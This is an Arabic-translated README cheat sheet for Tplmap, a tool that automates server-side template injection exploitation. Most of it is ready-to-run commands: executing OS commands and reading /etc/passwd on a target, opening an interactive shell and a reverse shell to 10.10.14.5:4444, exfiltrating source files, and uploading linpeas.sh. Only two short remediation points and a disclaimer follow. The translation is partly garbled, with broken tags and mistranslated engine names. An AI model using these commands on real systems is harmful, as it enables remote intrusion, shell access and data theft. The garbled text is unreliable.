<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - ورقة الغش كاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="أمان الويب وواجهة برمجة التطبيقات">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="محركات القوالب">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</ص>

<p align="center">
  <b>🌐 أداة استغلال تلقائية مصممة لاكتشاف واستغلال ثغرات حقن القالب من جانب الخادم (SSTI) لتحقيق تنفيذ التعليمات البرمجية عن بعد</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وثغرات SSTI](#-نظرة عامة--ثغرة-ssti)
- [محركات القوالب المدعومة](#-محركات القوالب المدعومة)
- [التثبيت](#-التثبيت)
- [اكتشاف الثغرات الأساسية](#-اكتشاف الثغرات الأساسية)
- [استهداف نقاط حقن محددة (علامة `*`)](#-نقاط حقن محددة الاستهداف--علامة)
- [تنفيذ الأوامر عن بعد (`--os-cmd`)](#-تنفيذ الأوامر عن بعد---os-cmd)
- [الأصداف التفاعلية والاتصالات العكسية](#-الأصداف التفاعلية--الاتصالات العكسية)
- [تحميل وتنزيل الملف](#-file-upload--download)
- [اختبار بيانات ورؤوس ما بعد النشر](#-اختبار-بيانات ما بعد--رؤوس)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والمعالجة](#-الاعتبارات الدفاعية--العلاج)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة ونقاط ضعف SSTI

**يحدث **حقن القالب من جانب الخادم (SSTI)** عندما يقوم أحد التطبيقات بتضمين مدخلات المستخدم التي لم يتم التحقق من صحتها مباشرةً في قالب من جانب الخادم بدلاً من تمريرها كبيانات سيتم عرضها. نظرًا لأن محركات القوالب الحديثة تسمح ببناء جملة مثل `{{7*7}}` أو `${7*7}`، يمكن للمهاجمين الخروج من وضع الحماية والوصول إلى بيئة التشغيل الأساسية (Python وJava وPHP وRuby وNode.js).

كتب بواسطة **Miroslav Stampar** و**Emilio Pinna**، **Tplmap** بمثابة "SQLMap لمحركات القوالب". فهو يقوم تلقائيًا بأخذ بصمات محرك القالب النشط، ويخرج من سياقات تقييم القالب، ويصعد تنفيذ التعليمات البرمجية إلى الوصول الكامل إلى نظام التشغيل Shell على مستوى نظام التشغيل.

---

## 🧩 محركات القوالب المدعومة

| اللغة | محركات القالب المدعومة |
|----------|---------------------------|
| **بايثون** | جينجا 2، ماكو، تورنادو، نونجوكس |
| ** PHP ** | غصين، سمارتي |
| **جافا** | فريماركر، السرعة |
| **روبي** | إرب، سليم |
| **Node.js** | اليشم، الصلصال، Dust.js |

---

## 📥 التثبيت

Tplmap مبني على لغة بايثون:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 الكشف الأساسي عن الثغرات الأمنية
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Remote Command Execution (`--os-cmd`)

بمجرد اكتشاف Tplmap للمحرك (على سبيل المثال، Jinja2)، قم بتنفيذ أوامر الصدفة العشوائية مباشرةً:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 الأصداف التفاعلية والاتصالات العكسية
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 تحميل وتنزيل الملف

استخراج كود المصدر أو تحميل أدوات الثبات:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 اختبار بيانات POST والعناوين
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** كشف SSTI في URL ** | `python tplmap.py -u "<URL>?param=*"` |
| ** تنفيذ الأمر عن بعد ** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **المحطة التفاعلية** | `python tplmap.py -u "<URL>" --os-shell` |
| ** إسقاط الغلاف العكسي ** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| ** تنزيل الملف البعيد ** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **تحميل ملف محلي** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| ** نص اختبار ما بعد ** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ الاعتبارات الدفاعية والعلاج

1. ** الهروب من إدراك السياق: ** لا تقم أبدًا بتسلسل إدخالات المستخدم الأولية في سلاسل القالب. استخدم آلية الربط المتغير الأصلية لمحرك القالب (على سبيل المثال، في Jinja2: `render_template('hello.html', name=user_input)` بدلاً من `render_template_string(f"Hello {user_input}")`).
2. **قيود وضع الحماية:** قم بفرض وضع الحماية بشكل صارم داخل المحركات حيث لا يمكن تجنب العرض الديناميكي، مما يمنع الوصول إلى `__class__` أو `__mro__` أو كائنات الانعكاس.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يقوم Tplmap بتنفيذ تعليمات برمجية عن بعد عشوائية على خوادم التطبيقات المستهدفة. يعد اختبار أو استغلال تطبيقات الويب دون الحصول على إذن كتابي مسبق أمرًا غير قانوني تمامًا.